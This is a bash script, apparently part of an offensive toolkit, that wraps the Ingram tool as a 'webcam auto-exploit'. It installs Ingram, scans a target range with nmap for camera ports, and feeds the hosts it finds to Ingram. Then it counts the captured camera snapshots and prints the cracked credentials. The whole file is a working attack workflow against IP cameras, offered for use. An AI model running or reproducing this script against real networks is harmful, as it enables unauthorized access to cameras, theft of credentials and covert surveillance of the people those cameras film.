#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"

set -uo pipefail

banner "INGRAM — WEBCAM AUTO-EXPLOIT" "snapshot · credential attack · stream discovery"

# ── Dependency check ──────────────────────────────────────────────────────────
require_tool python3 "apt install python3"

# Check Ingram is installed (pip package or standalone command)
_HAS_INGRAM=0
_INGRAM_CMD=""

if command -v ingram &>/dev/null; then
    _HAS_INGRAM=1
    _INGRAM_CMD="ingram"
elif python3 -c "import ingram" &>/dev/null 2>&1; then
    _HAS_INGRAM=1
    _INGRAM_CMD="python3 -m ingram"
fi

if [[ $_HAS_INGRAM -eq 0 ]]; then
  printf '  %s[!]%s Ingram is not installed.%s\n\n' "${RED}" "${RESET}" "${RESET}"
  printf '  %s[*]%s Install options:\n\n' "${CYAN}" "${RESET}"
  printf '  %s  pip install Ingram%s\n' "${GREEN}" "${RESET}"
  printf '  %s  pip install Ingram --break-system-packages%s\n\n' "${GREEN}" "${RESET}"
  printf '  %s>>%s Install now? [Y/n]: ' "${CYAN}" "${RESET}"
  read -r _do_install </dev/tty || _do_install="n"
  if [[ "${_do_install,,}" != "n" ]]; then
    printf '\n'
    if pip install Ingram --break-system-packages 2>&1 | grep -qiE "Successfully installed|already satisfied"; then
      printf '  %s[✔]%s Ingram installed%s\n\n' "${GREEN}" "${RESET}" "${RESET}"
      _HAS_INGRAM=1
      _INGRAM_CMD="python3 -m ingram"
    else
      pip install Ingram 2>&1 || true
      if python3 -c "import ingram" &>/dev/null 2>&1; then
        printf '  %s[✔]%s Ingram installed%s\n\n' "${GREEN}" "${RESET}" "${RESET}"
        _HAS_INGRAM=1
        _INGRAM_CMD="python3 -m ingram"
      else
        printf '  %s[!]%s Install failed — check pip output above.%s\n\n' "${RED}" "${RESET}" "${RESET}"
        exit 1
      fi
    fi
  else
    exit 0
  fi
fi

# Verify Ingram's own dependencies are present
printf '  %s[*]%s Checking Ingram dependencies...%s\n' "${CYAN}" "${RESET}" "${RESET}"
_missing_deps=()
for _dep in requests PIL paramiko colorama tqdm; do
  if ! python3 -c "import ${_dep}" &>/dev/null 2>&1; then
    _missing_deps+=("$_dep")
  fi
done

if [[ ${#_missing_deps[@]} -gt 0 ]]; then
  printf '  %s[~]%s Missing Python deps: %s%s%s\n' \
    "${YELLOW}" "${RESET}" "${YELLOW}" "${_missing_deps[*]}" "${RESET}"
  printf '  %s[*]%s Installing missing dependencies...%s\n' "${CYAN}" "${RESET}" "${RESET}"
  # Map import names to pip package names
  for _dep in "${_missing_deps[@]}"; do
    case "$_dep" in
      PIL)      _pkg="Pillow" ;;
      *)        _pkg="$_dep" ;;
    esac
    pip install --quiet --break-system-packages "$_pkg" 2>/dev/null \
      || pip install --quiet "$_pkg" 2>/dev/null \
      || printf '  %s[!]%s Could not install %s%s\n' "${YELLOW}" "${RESET}" "$_pkg" "${RESET}"
  done
fi
printf '  %s[✔]%s Dependencies OK%s\n\n' "${GREEN}" "${RESET}" "${RESET}"

# ── Target input ──────────────────────────────────────────────────────────────
target="$(prompt_target)"
outdir="$(make_outdir)"
_ingram_out="${outdir}/ingram_out"
mkdir -p "$_ingram_out"

printf '  %s[SYS]%s Target  : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$target" "${RESET}"
printf '  %s[SYS]%s Output  : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$_ingram_out" "${RESET}"

# ── Mode selection ────────────────────────────────────────────────────────────
printf '  %s┌──────────────────────────────────────────────────┐%s\n' "${CYAN}" "${RESET}"
printf '  %s│  SCAN MODE                                       │%s\n' "${CYAN}${BOLD}" "${RESET}"
printf '  %s└──────────────────────────────────────────────────┘%s\n' "${CYAN}" "${RESET}"
printf '\n'
printf '  %s[01]%s ▶  Auto    scan CIDR + exploit found cameras\n'   "${GREEN}" "${RESET}"
printf '  %s[02]%s ▶  Single  target one IP directly\n'              "${CYAN}" "${RESET}"
printf '  %s[03]%s ▶  List    provide a file of IPs\n'               "${CYAN}" "${RESET}"
printf '\n'
printf '  %s>>%s ' "${CYAN}" "${RESET}"
read -r _mode </dev/tty || _mode="1"

_ip_file=""
_cleanup_file=0

case "${_mode:-1}" in
  2)
    # Single IP — write to temp file
    printf '  %s>>%s Camera IP: ' "${CYAN}" "${RESET}"
    read -r _single_ip </dev/tty || _single_ip=""
    if [[ -z "${_single_ip:-}" ]]; then
      printf '  %s[!] No IP entered.%s\n\n' "${RED}" "${RESET}"
      exit 1
    fi
    _ip_file="/tmp/.fsec_ingram_$$"
    printf '%s\n' "$_single_ip" > "$_ip_file"
    _cleanup_file=1
    ;;
  3)
    printf '  %s>>%s Path to IP list file: ' "${CYAN}" "${RESET}"
    read -r _ip_file </dev/tty || _ip_file=""
    if [[ -z "${_ip_file:-}" || ! -f "$_ip_file" ]]; then
      printf '  %s[!] File not found.%s\n\n' "${RED}" "${RESET}"
      exit 1
    fi
    ;;
  *)
    # Auto — first do a quick nmap to find cameras, then feed to Ingram
    section "CAMERA DISCOVERY  (rootless -sT)"
    printf '  %s[*]%s Scanning %s for camera ports 80,443,554,8080,8554...%s\n' \
      "${CYAN}" "${RESET}" "$target" "${RESET}"

    _ip_file="/tmp/.fsec_ingram_$$"
    _cleanup_file=1

    start_spin "nmap running"
    nmap -sT --unprivileged -Pn -n -T4 --open \
      -p 80,443,554,8080,8554,8000,37777 \
      "$target" 2>/dev/null \
    | grep "scan report" \
    | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' \
    > "$_ip_file" || true
    stop_spin

    _count=$(wc -l < "$_ip_file" 2>/dev/null || echo 0)
    if [[ "$_count" -eq 0 ]]; then
      printf '  %s[~]%s No camera ports found on %s.%s\n\n' "${YELLOW}" "${RESET}" "$target" "${RESET}"
      rm -f "$_ip_file"
      exit 0
    fi
    printf '  %s[+]%s %s%d%s host(s) with camera ports — handing to Ingram\n\n' \
      "${GREEN}" "${RESET}" "${CYAN}" "$_count" "${RESET}"
    ;;
esac

# ── Run Ingram ────────────────────────────────────────────────────────────────
section "INGRAM EXPLOIT"
printf '  %s[*]%s Targets file : %s%s%s\n' "${CYAN}" "${RESET}" "${DIM}" "$_ip_file" "${RESET}"
printf '  %s[*]%s Output dir   : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$_ingram_out" "${RESET}"

trap '[[ $_cleanup_file -eq 1 ]] && rm -f "$_ip_file" 2>/dev/null; true' EXIT INT

# shellcheck disable=SC2086
$_INGRAM_CMD --in "$_ip_file" --out "$_ingram_out" || true

# ── Results summary ───────────────────────────────────────────────────────────
printf '\n'
printf '  %s┌──────────────────────────────────────────────────┐%s\n' "${CYAN}" "${RESET}"
printf '  %s│  RESULTS                                         │%s\n' "${CYAN}${BOLD}" "${RESET}"
printf '  %s└──────────────────────────────────────────────────┘%s\n' "${CYAN}" "${RESET}"
printf '\n'

_snap_dir="${_ingram_out}/snapshots"
_snaps=0
if [[ -d "$_snap_dir" ]]; then
  _snaps=$(find "$_snap_dir" -maxdepth 1 \( -name "*.jpg" -o -name "*.jpeg" -o -name "*.png" \) 2>/dev/null | wc -l)
fi

_cred_file="${_ingram_out}/cracked.txt"
_creds=0
if [[ -f "$_cred_file" ]]; then
  _creds=$(grep -c "." "$_cred_file" 2>/dev/null || echo 0)
fi

printf '  %s[SYS]%s Snapshots captured : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$_snaps" "${RESET}"
printf '  %s[SYS]%s Credentials found  : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$_creds" "${RESET}"
printf '  %s[SYS]%s Output directory   : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$_ingram_out" "${RESET}"

if [[ $_snaps -gt 0 ]]; then
  printf '  %s[✔] Camera snapshots saved — check %s%s\n\n' "${GREEN}" "$_snap_dir" "${RESET}"
fi
if [[ $_creds -gt 0 ]]; then
  printf '  %s[✔] Cracked credentials:%s\n' "${GREEN}" "${RESET}"
  cat "$_cred_file" | while IFS= read -r _line; do
    printf '  %s      %s%s\n' "${GREEN}" "$_line" "${RESET}"
  done
  printf '\n'
fi
